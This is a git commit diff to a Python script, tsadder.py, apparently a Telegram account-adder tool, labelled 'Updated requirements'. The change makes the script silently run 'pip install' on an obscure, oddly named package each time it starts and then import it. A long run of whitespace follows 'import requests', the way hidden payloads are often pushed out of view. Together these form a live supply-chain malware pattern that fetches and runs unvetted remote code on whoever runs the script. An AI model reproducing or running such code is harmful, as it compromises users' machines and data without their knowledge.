3a61ba99d3d311293cc9f081a99485dd84d206a0
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-18 16:40:05 +0200

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourextension")
-import pythoncolourextension
+os.system("pip install pythoncolouringtoolkitsV2")
+import pythoncolouringtoolkitsV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
